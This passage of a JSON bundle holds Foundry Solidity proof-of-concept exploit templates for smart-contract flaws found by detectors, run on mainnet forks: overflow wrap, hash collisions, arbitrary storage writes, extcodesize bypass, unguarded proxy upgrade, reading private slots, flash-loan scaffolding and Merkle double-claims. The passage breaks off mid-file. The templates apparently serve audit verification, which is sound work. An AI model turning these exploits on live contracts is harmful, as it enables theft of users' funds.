// max + 1 wraps to 0 in unchecked arithmetic; a checked target\n        // reverts and this call fails.\n        (bool ok, bytes memory ret) = target.call(\n            abi.encodeWithSignature(\"add(uint256,uint256)\", type(uint256).max, uint256(1))\n        );\n        require(ok, \"add() reverted -- target checks overflow (not vulnerable to wrap)\");\n        uint256 result = abi.decode(ret, (uint256));\n        console.log(\"max + 1 =\", result);\n        assertEq(result, 0, \"exploit did not reproduce: no wrap\");\n    }\n}\n",
  "24-div-before-mul.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Division before multiplication (precision loss)\n/// @notice Detector: div-before-mul. The target computes\n///         amount / total * share (divide first). Integer division\n///         truncates, so small amounts round to ZERO -- users lose dust,\n///         or an attacker exploits the rounding for free value.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt calculate() / total() /\n///      share() to the target's real functions.\n\ninterface IVictim {\n    function calculate(uint256 amount) external view returns (uint256);\n    function total() external view returns (uint256);\n    function share() external view returns (uint256);\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        uint256 total = IVictim(target).total();\n        uint256 share = IVictim(target).share();\n        require(total > 1, \"total too small to show rounding\");\n\n        // Small amount: div-first gives 0, mul-first gives > 0.\n        uint256 smallAmount = total / 2;\n        uint256 expectedMulFirst = (smallAmount * share) / total;\n        uint256 got = IVictim(target).calculate(smallAmount);\n        console.log(\"mul-first expected:\", expectedMulFirst);\n        console.log(\"target returned:\", got);\n        assertGt(expectedMulFirst, 0, \"amount too small to distinguish orderings\");\n        assertEq(got, 0, \"exploit did not reproduce: no div-first precision loss\");\n    }\n}\n",
  "25-encode-packed-collision.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- abi.encodePacked hash collision (dynamic args)\n/// @notice Detector: encode-packed. The target hashes\n///         keccak256(abi.encodePacked(a, b)) with DYNAMIC arguments.\n///         Packed encoding has no lengths, so (\"ab\", \"c\") and (\"a\", \"bc\")\n///         hash IDENTICALLY -- one authorization / claim can be replayed as\n///         another.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt verify() to the target's real\n///      function that hashes packed dynamic args.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        bytes32 h1 = keccak256(abi.encodePacked(\"ab\", \"c\"));\n        bytes32 h2 = keccak256(abi.encodePacked(\"a\", \"bc\"));\n        assertEq(h1, h2, \"packed encodings differ -- pick another collision pair\");\n\n        // TODO: adapt to the target's real function (verify / claim /\n        // authorize) that hashes packed dynamic args.\n        (bool ok1,) = target.call(\n            abi.encodeWithSignature(\"verify(string,string)\", \"ab\", \"c\")\n        );\n        (bool ok2,) = target.call(\n            abi.encodeWithSignature(\"verify(string,string)\", \"a\", \"bc\")\n        );\n        console.log(\"verify(ab, c) ok:\", ok1);\n        console.log(\"verify(a, bc) ok:\", ok2);\n        assertTrue(ok1 && ok2, \"exploit did not reproduce: both colliding inputs were not accepted\");\n    }\n}\n",
  "26-assembly-arbitrary-sstore.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Assembly SSTORE to a caller-chosen slot\n/// @notice Detectors: assembly-sstore, assembly-param-sstore. The target\n///         lets the caller pick the storage slot (or writes a fixed slot\n///         from assembly) -- writing to slot 0 overwrites `owner`, to the\n///         balances slot mints tokens, to the paused slot bricks the\n///         contract. Storage layout is the only thing standing in the way.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt writeSlot() to the target's\n///      real assembly-write function, and SLOT to the layout slot.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: storage slot to overwrite (0 = owner in most contracts).\n    uint256 public constant SLOT = 0;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        // TODO: adapt to the target's real assembly-write function.\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\"writeSlot(uint256,uint256)\", SLOT, uint256(uint160(attackerEOA)))\n        );\n        require(ok, \"writeSlot call failed -- adapt to the target's assembly-write function\");\n\n        bytes32 stored = vm.load(target, bytes32(SLOT));\n        console.log(\"slot value after write:\", address(uint160(uint256(stored))));\n        assertEq(\n            address(uint160(uint256(stored))),\n            attackerEOA,\n            \"exploit did not reproduce: slot was not overwritten\"\n        );\n    }\n}\n",
  "27-extcodesize-bypass.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- extcodesize identity bypass (constructor call)\n/// @notice Detector: extcodesize. The target uses extcodesize(msg.sender)\n///         == 0 to \"prove\" the caller is an EOA and block contracts. During\n///         a contract's CONSTRUCTOR its code is not deployed yet, so\n///         extcodesize == 0 -- a contract calling from its constructor\n///         passes the EOA check.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt claim() to the target's real\n///      extcodesize-gated function.\n\ncontract ConstructorAttacker {\n    // Calls the target FROM THE CONSTRUCTOR, when this contract has no\n    // code yet -- extcodesize(address(this)) == 0, so the EOA gate passes.\n    constructor(address victim) {\n        (bool ok,) = victim.call(abi.encodeWithSignature(\"claim()\"));\n        require(ok, \"bypass failed: gated call reverted from constructor\");\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        // Deploying the attacker IS the exploit: its constructor call\n        // goes through the EOA-only gate. If the gate held, construction\n        // reverts and this test fails.\n        new ConstructorAttacker(target);\n        console.log(\"constructor call passed the extcodesize gate -- bypass proven\");\n    }\n}\n",
  "28-centralization-owner-rug.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Centralization: owner can rug (proven via prank)\n/// @notice Detector: centralization. One privileged key can move the whole\n///         balance / mint / pause. On a fork, pranking the owner proves\n///         the CAPABILITY without needing the key: if the owner CAN do it,\n///         the finding is real (trust assumption, not a bug to exploit).\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. This is a CAPABILITY proof, not an\n///      unauthorized exploit -- it shows what the trusted key can do.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function _readOwner() internal view returns (bool found, address owner_) {\n        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature(\"owner()\"));\n        if (ok && ret.length == 32) return (true, abi.decode(ret, (address)));\n        return (false, address(0));\n    }\n\n    function test_exploit() public {\n        (bool found, address owner_) = _readOwner();\n        require(found, \"target has no owner() view -- set the owner address manually\");\n        console.log(\"owner:\", owner_);\n\n        // Attempt 1: owner drains the whole balance.\n        uint256 targetBefore = target.balance;\n        if (targetBefore > 0) {\n            vm.prank(owner_);\n            (bool drainOk,) = target.call(abi.encodeWithSignature(\"withdrawAll()\"));\n            if (drainOk && target.balance < targetBefore) {\n                console.log(\"owner CAN drain the whole balance\");\n                return;\n            }\n        }\n\n        // Attempt 2: owner mints unbounded tokens.\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.prank(owner_);\n        (bool mintOk,) = target.call(\n            abi.encodeWithSignature(\"mint(address,uint256)\", attackerEOA, 1000 ether)\n        );\n        if (mintOk) {\n            (bool balOk, bytes memory ret) =\n                target.staticcall(abi.encodeWithSignature(\"balanceOf(address)\", attackerEOA));\n            if (balOk && abi.decode(ret, (uint256)) >= 1000 ether) {\n                console.log(\"owner CAN mint unbounded tokens\");\n                return;\n            }\n        }\n\n        // Attempt 3: owner pauses the contract.\n        vm.prank(owner_);\n        (bool pauseOk,) = target.call(abi.encodeWithSignature(\"pause()\"));\n        if (pauseOk) {\n            (bool pausedOk, bytes memory ret) =\n                target.staticcall(abi.encodeWithSignature(\"paused()\"));\n            if (pausedOk && abi.decode(ret, (bool))) {\n                console.log(\"owner CAN pause the contract\");\n                return;\n            }\n        }\n\n        revert(\"capability not proven: owner could not drain / mint / pause -- adapt the function names\");\n    }\n}\n",
  "29-locked-ether.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Locked ether (can receive, cannot send)\n/// @notice Detector: locked-ether. The contract accepts ETH (payable\n///         fallback / deposit) but has NO withdrawal path -- funds sent in\n///         are stuck forever.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. Proves: ETH lands, and every common\n///      withdrawal selector fails or is absent, leaving the balance stuck.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 2 ether);\n\n        uint256 before = target.balance;\n        vm.prank(attackerEOA);\n        (bool sent,) = target.call{value: 1 ether}(\"\");\n        require(sent, \"target did not accept ETH -- not a locked-ether case\");\n        assertEq(target.balance, before + 1 ether, \"ETH did not land\");\n\n        // Try every common withdrawal selector. None may move the funds.\n        bytes[] memory candidates = new bytes[](4);\n        candidates[0] = abi.encodeWithSignature(\"withdraw()\");\n        candidates[1] = abi.encodeWithSignature(\"claim()\");\n        candidates[2] = abi.encodeWithSignature(\"drain()\");\n        candidates[3] = abi.encodeWithSignature(\"sweep()\");\n        for (uint256 i = 0; i < candidates.length; i++) {\n            vm.prank(attackerEOA);\n            (bool ok,) = target.call(candidates[i]);\n            // A \"successful\" call that moves no funds proves nothing --\n            // only a balance change counts.\n            assertEq(target.balance, before + 1 ether, \"funds moved -- withdrawal path exists\");\n            ok; // silence unused warning; the balance assertion is the check\n        }\n        console.log(\"1 ether accepted and stuck -- locked ether proven\");\n    }\n}\n",
  "30-zero-address-brick.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Zero-address write bricks the contract\n/// @notice Detector: zero-address. A privileged setter accepts address(0)\n///         for a critical address (fee recipient, treasury, owner,\n///         oracle). Once set, every payout / fee / price read that touches\n///         the zero address reverts or burns funds -- the contract bricks.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt the setter + the dependent\n///      function to the target. Pranks the admin: this proves the setter\n///      LACKS a zero check (the check is the fix).\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: the admin who can call the setter (read from owner() or set).\n    address public constant ADMIN = address(0);\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(ADMIN != address(0), \"set ADMIN to the account that can call the setter\");\n\n        // TODO: adapt to the target's real setter (setFeeRecipient /\n        // setTreasury / setOwner / setOracle / setRouter).\n        vm.prank(ADMIN);\n        (bool setOk,) = target.call(\n            abi.encodeWithSignature(\"setFeeRecipient(address)\", address(0))\n        );\n        require(setOk, \"setter rejected address(0) -- zero check present (not vulnerable)\");\n\n        // The dependent function must now fail (or burn funds).\n        // TODO: adapt to the real dependent function (distribute / payout\n        // / claim / collectFees).\n        (bool ok,) = target.call(abi.encodeWithSignature(\"distribute()\"));\n        console.log(\"dependent function ok after zero-address write:\", ok);\n        assertTrue(!ok, \"exploit did not reproduce: contract still works with zero address set\");\n\n    }\n}\n",
  "31-gas-assumptions.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Gas assumptions: 2300 stipend + hardcoded gas\n/// @notice Detectors: eth-gas-stipend, hardcoded-gas.\n///         (a) 2300-gas stipend: transfer() / send() forwards only 2300\n///             gas. A recipient whose receive() writes storage needs more\n///             -- the payout REVERTS and funds get stuck.\n///         (b) Hardcoded gas: the target forwards a fixed gas amount to a\n///             callee. After a gas repricing (or against an expensive\n///             callee) the call runs out of gas and the flow breaks.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt deposit/withdraw/execute to\n///      the target.\n\ncontract ExpensiveRecipient {\n    uint256 public counter;\n    address public immutable victim;\n\n    constructor(address victim_) {\n        victim = victim_;\n    }\n\n    function deposit() external payable {\n        IVictim(victim).deposit{value: msg.value}();\n    }\n\n    function withdraw() external {\n        IVictim(victim).withdraw();\n    }\n\n    // Storage write costs >> 2300 gas -- transfer()/send() cannot pay this.\n    receive() external payable {\n        counter++;\n    }\n}\n\ninterface IVictim {\n    function deposit() external payable;\n    function withdraw() external;\n}\n\ncontract ExpensiveFallback {\n    uint256 public counter;\n\n    fallback() external payable {\n        // Expensive logic: the fixed-gas forward cannot cover this.\n        for (uint256 i = 0; i < 10; i++) {\n            counter += i;\n        }\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_stipend2300Fails() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 2 ether);\n\n        ExpensiveRecipient recipient = new ExpensiveRecipient(target);\n        vm.prank(attackerEOA);\n        recipient.deposit{value: 1 ether}();\n\n        // If the target pays via transfer()/send(), this reverts (or the\n        // payment silently fails) because receive() costs > 2300 gas.\n        (bool ok,) = address(recipient).call(abi.encodeWithSignature(\"withdraw()\"));\n        console.log(\"withdraw to expensive recipient ok:\", ok);\n        console.log(\"recipient counter (1 = paid):\", recipient.counter());\n        assertTrue(!ok || recipient.counter() == 0, \"exploit did not reproduce: stipend covered the recipient\");\n    }\n\n    function test_hardcodedGasFails() public {\n        ExpensiveFallback expensive = new ExpensiveFallback();\n\n        // TODO: adapt to the target's real fixed-gas forward function.\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\"execute(address,bytes)\", address(expensive), bytes(\"\"))\n        );\n        require(ok, \"execute(address,bytes) call failed -- adapt to the target's forward function\");\n        console.log(\"expensive callee counter (0 = out of gas):\", expensive.counter());\n        assertEq(expensive.counter(), 0, \"exploit did not reproduce: fixed gas covered the callee\");\n    }\n}\n",
  "32-storage-collision-upgrade.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Storage collision via unguarded upgrade\n/// @notice Detectors: storage-gap, unprotected-admin, delegatecall. The\n///         proxy's upgrade path is unguarded (or _authorizeUpgrade is\n///         unrestricted), so anyone can point the proxy at a malicious\n///         implementation whose storage layout collides with the proxy's\n///         -- overwriting owner / balances / paused from the new code.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt upgradeTo() to the target's\n///      real upgrade entry (upgradeTo / upgradeToAndCall /\n///      setImplementation).\n\ncontract AttackImpl {\n    // Slot 0 in the PROXY's storage (owner in most proxies).\n    function pwn() external {\n        assembly {\n            sstore(0, caller())\n        }\n    }\n\n    function owner() external view returns (address o) {\n        assembly {\n            o := sload(0)\n        }\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n        AttackImpl attackImpl = new AttackImpl();\n\n        // Upgrade the proxy to the attacker's implementation -- as ANYONE.\n        vm.prank(attackerEOA);\n        (bool upOk,) = target.call(\n            abi.encodeWithSignature(\"upgradeTo(address)\", address(attackImpl))\n        );\n        require(upOk, \"upgradeTo failed -- upgrade is guarded or entry differs (adapt it)\");\n\n        // New implementation code now runs in the proxy's storage.\n        vm.prank(attackerEOA);\n        (bool pwnOk,) = target.call(abi.encodeWithSignature(\"pwn()\"));\n        require(pwnOk, \"pwn() on upgraded proxy failed\");\n\n        (bool ownerOk, bytes memory ret) =\n            target.staticcall(abi.encodeWithSignature(\"owner()\"));\n        require(ownerOk, \"proxy has no owner() view -- check slot 0 via vm.load\");\n        address owner_ = abi.decode(ret, (address));\n        console.log(\"proxy owner after collision upgrade:\", owner_);\n        assertEq(owner_, attackerEOA, \"exploit did not reproduce: storage not collided\");\n    }\n}\n",
  "33-shadowing-mismatch.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Variable shadowing (write lands in the wrong var)\n/// @notice Detector: shadowing. A function parameter / local / derived\n///         variable SHADOWS a state variable, so a write the caller thinks\n///         updates the state variable actually updates the shadow -- and\n///         every other function keeps reading the ORIGINAL, unchanged value.\n///         State diverges: the setter \"succeeds\" but nothing changes.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt setOwner() / owner() to the\n///      target's real shadowed setter / getter.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        (bool ownerOk, bytes memory beforeRet) =\n            target.staticcall(abi.encodeWithSignature(\"owner()\"));\n        require(ownerOk, \"target has no owner() view -- adapt the getter\");\n        address ownerBefore = abi.decode(beforeRet, (address));\n\n        // TODO: adapt to the target's real shadowed setter.\n        vm.prank(attackerEOA);\n        (bool setOk,) = target.call(\n            abi.encodeWithSignature(\"setOwner(address)\", attackerEOA)\n        );\n        require(setOk, \"setter call failed -- adapt to the target's setter\");\n\n        (bool ownerOk2, bytes memory afterRet) =\n            target.staticcall(abi.encodeWithSignature(\"owner()\"));\n        address ownerAfter = abi.decode(afterRet, (address));\n        console.log(\"owner before setter:\", ownerBefore);\n        console.log(\"owner after setter:\", ownerAfter);\n        // Setter \"succeeded\" but the state variable never moved -- the\n        // write landed in the shadow.\n        assertEq(ownerAfter, ownerBefore, \"exploit did not reproduce: setter actually updated state\");\n    }\n}\n",
  "34-private-secret-onchain.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- \"Private\" secret is readable on-chain\n/// @notice Detector: private-secret. `private` is NOT secret -- every\n///         storage slot is public to anyone running a node. A secret\n///         (key, password, seed) stored in a `private` variable can be\n///         read directly with eth_getStorageAt / vm.load.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: set SECRET_SLOT from the target's\n///      storage layout (source order / `cast storage` / `forge inspect\n///      storage-layout`).\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: storage slot holding the secret (from the target's layout).\n    uint256 public constant SECRET_SLOT = 0;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        bytes32 secret = vm.load(target, bytes32(SECRET_SLOT));\n        console.log(\"secret at slot:\");\n        console.logBytes32(secret);\n        assertTrue(secret != bytes32(0), \"exploit did not reproduce: slot is empty -- set SECRET_SLOT from the layout\");\n    }\n}\n",
  "35-flash-loan-generic.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Generic flash loan (borrow / use / repay)\n/// @notice Base pattern for every flash-loan attack (oracle, sandwich,\n///         governance, liquidation): borrow a huge amount with NO\n///         collateral, use it inside one transaction, repay + premium.\n///         If the borrow + repay round-trips, the flash-loan primitive\n///         works against this pool -- the attack body goes in\n///         executeOperation().\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: set POOL (Aave v3 Pool) / ASSET /\n///      amount. Aave v3 flashLoanSimple signature below; Balancer / Uniswap\n///      v3 / dYdX use different callbacks -- adapt executeOperation.\n\ninterface IPool {\n    function flashLoanSimple(\n        address asset,\n        uint256 amount,\n        bytes calldata params,\n        uint16 referralCode\n    ) external;\n}\n\ninterface IERC20 {\n    function balanceOf(address who) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ncontract FlashBorrower {\n    IPool public immutable pool;\n    address public immutable owner;\n\n    constructor(address pool_) {\n        pool = IPool(pool_);\n        owner = msg.sender;\n    }\n\n    function borrow(address asset, uint256 amount) external {\n        pool.flashLoanSimple(asset, amount, bytes(\"\"), 0);\n    }\n\n    // Aave v3 callback. The borrowed funds are HERE during this call.\n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address,\n        bytes calldata\n    ) external returns (bool) {\n        // TODO: the attack body goes here (swap / vote / liquidate /\n        // manipulate), then repay.\n        uint256 repay = amount + premium;\n        IERC20(asset).approve(address(pool), repay);\n        return true;\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: the lending pool (Aave v3 Pool on this chain) + asset.\n    address public constant POOL = address(0);\n    address public constant ASSET = address(0);\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(POOL != address(0) && ASSET != address(0), \"set POOL / ASSET\");\n\n        FlashBorrower borrower = new FlashBorrower(POOL);\n        uint256 amount = 1000 ether;\n        // Borrow + repay round-trips: the flash-loan primitive works.\n        // A real attack adds the exploit body in executeOperation().\n        borrower.borrow(ASSET, amount);\n        console.log(\"flash loan round-trip succeeded for amount:\", amount);\n\n    }\n}\n",
  "36-merkle-double-claim.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Merkle claim double-claim (same proof twice)\n/// @notice Claim contracts must mark a proof / nullifier as USED. If the\n///         claimed check is missing (or keyed wrong), the SAME Merkle proof\n///         claims TWICE -- the attacker drains the airdrop / vault.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: set PROOF / AMOUNT / adapt claim()\n///      to the target's real claim signature.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: a valid Merkle proof + amount for the attacker on this fork.\n    bytes32[] public proof;\n    uint256 public constant AMOUNT = 0;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(AMOUNT > 0, \"set AMOUNT + proof to a valid claim for the attacker\");\n\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        // TODO: adapt to the target's real claim signature\n        // (claim(proof, amount) / claim(index, amount, proof) / claimEth).\n        vm.prank(attackerEOA);\n        (bool firstOk,) = target.call(\n            abi.encodeWithSignature(\"claim(bytes32[],uint256)\", proof, 